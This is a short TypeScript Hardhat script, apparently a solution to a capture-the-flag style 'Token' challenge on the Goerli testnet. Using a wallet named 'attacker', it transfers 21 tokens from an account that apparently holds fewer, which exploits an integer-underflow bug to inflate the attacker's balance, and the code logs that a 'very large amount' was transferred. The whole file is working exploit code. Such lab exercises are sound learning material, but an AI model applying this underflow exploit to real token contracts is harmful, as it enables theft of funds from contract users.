import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import { Wallet } from "ethers";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Token"
const CONTRACT_ADDRESS = "0x979D4626CD645570F3B84AE255F2fC01b4903A0b"

async function main() {
    let tx: TransactionResponse

    const factory = await ethers.getContractFactory(CONTRACT_NAME)
    const contract = factory.attach(CONTRACT_ADDRESS)

    tx = await contract.connect(attacker).transfer(Wallet.createRandom().address, 21)
    await tx.wait()

    console.log("Token: transfered very large amount of tokens");
    console.log(await contract.balanceOf(attacker.address))
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });